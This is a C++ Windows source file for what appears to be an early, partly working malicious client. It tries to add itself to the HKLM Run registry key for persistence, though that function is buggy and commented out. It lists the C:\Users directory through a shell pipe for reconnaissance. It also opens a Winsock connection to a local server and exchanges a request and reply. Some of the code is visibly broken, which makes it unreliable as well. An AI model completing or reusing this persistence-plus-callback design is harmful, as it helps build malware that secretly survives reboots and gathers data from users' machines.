// try_3.cpp : Defines the entry point for the console application.
// Purpose:  This is a functioning client

#include "stdafx.h"
#include <iostream>
#include <WS2tcpip.h>
#include <string>
#include <winapifamily.h>
#include <stdlib.h>
#include <stdio.h>

//specify WinSock lib or else symbols will not match
#pragma comment(lib,"ws2_32.lib") //WinSock lib

/*
 * This function will edit registries in order to 
 * obtain persistence for the client and check to
 * see if this has already been accomplished.
 */
int reg_maker() {
	int result = 0; //holds the result of function
	
	//check if reg key exists
	char* key = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
	HKEY hkey;
	if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, key, 0, KEY_READ, &hkey) == ERROR_SUCCESS) {
		std::cout << "if one" << std::endl;
		DWORD data = 0;
		DWORD length = sizeof(data);
		DWORD type = REG_DWORD;
		char* value = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Persistence";

		//Query Value to check if it has the location of the file in it
		///////////////////////////////////////ERROR HERE//////////////////////////////////////////////
		if (RegQueryValueExA(HKEY_LOCAL_MACHINE, value, 0, (LPDWORD)&type, (LPBYTE)&data, &length) != ERROR_SUCCESS)
			std::cout << "Could not query reg key" << std::endl;
		///////////////////////////////////////////////////////////////////////////////////////////////
		else {
			//data += "C:\\Users\\michael\\Documents\\Visual Studio 2015\\Projects\\try_3\\Debug\\try_3.exe";
			//Add key inside try_3 using the RegSetValueExA function
			if (RegSetValueExA(HKEY_LOCAL_MACHINE, value, NULL, REG_DWORD, (LPBYTE)&data, sizeof(DWORD)) != ERROR_SUCCESS)
				std::cout << "Failed to set registry value" << std::endl;
			std::cout << data << std::endl;
		}
	}
	else
		std::cout << "Could not open reg key" << std::endl;

	
	
	//close registry editor
	return 0;
}


/*
 *This function prints the directories/files of the Users
 *directory and sends them to the char buffer via the pipe
 */
int startup_finder() {
	const char* cmd = "dir C:\\Users";
	char buffer[128];
	std::string result = "";
	FILE* _pipe = _popen(cmd, "r");

	if (!_pipe) {
		std::cout << "ERROR" << std::endl;
	}
	
	while (!feof(_pipe)) {
		if (fgets(buffer, 128, _pipe) != NULL)
			result += buffer;
	}
	_pclose(_pipe);

	std::cout << result << std::endl;
	//////////////NEED TO PARSE/////////////////

	return 0;
}

/*
 *
 */
int main()
{
	//reg_maker();
	startup_finder();

	//Initialize Socket
	WSAData version; //We need to check the version
	WORD mkword = MAKEWORD(2, 2);
	int what = WSAStartup(mkword, &version);
	if (what != 0) {
		std::cout << "This version is not supported! - \n" << WSAGetLastError() << std::endl;
	}
	else {
		std::cout << "Good - Everything fine!\n" << std::endl;
	}
	//////////////////////////////////////////////////////////

	//Create Socket
	SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
	if (s == INVALID_SOCKET) {
		std::cout << "Failed to create socket" << std::endl;
	}
	else
		std::cout << "Socket created woot!" << std::endl;
	//////////////////////////////////////////////////////////


	//Connect to Server
	//IPv4 AF_INET SOCKET
	sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(8080);
	inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr); //can't use inet_addr b/c it's deprecated so include WS2tcip instead of WinSock2
	
	int conn = connect(s, (SOCKADDR*)&addr, sizeof(addr));
	if (conn == SOCKET_ERROR) {
		std::cout << "Failed to connect\n" << WSAGetLastError() << std::endl;
	}
	//////////////////////////////////////////////////////////

	//send data
	char* mymsg = "GET / HTTP/1.1\r\n\r\n";
	char vect[512] = { 0 };

	int smsg_result = send(s, mymsg, sizeof(mymsg), 0);
	if (smsg_result == SOCKET_ERROR) {
		std::cout << "Error in Sending: " << WSAGetLastError() << std::endl;
	}

	//Recv message
	int recv_result = recv(s, vect, 512, 0);
	if (recv_result == SOCKET_ERROR) {
		std::cout << "Error in Receiving: " << WSAGetLastError() << std::endl;
	}
	else
		std::cout << recv_result << std::endl;
	//////////////////////////////////////////////////////////
	std::string placeholderxxx;
	std::cin >> placeholderxxx;

	closesocket(s);
	WSACleanup();

    return 0;
}

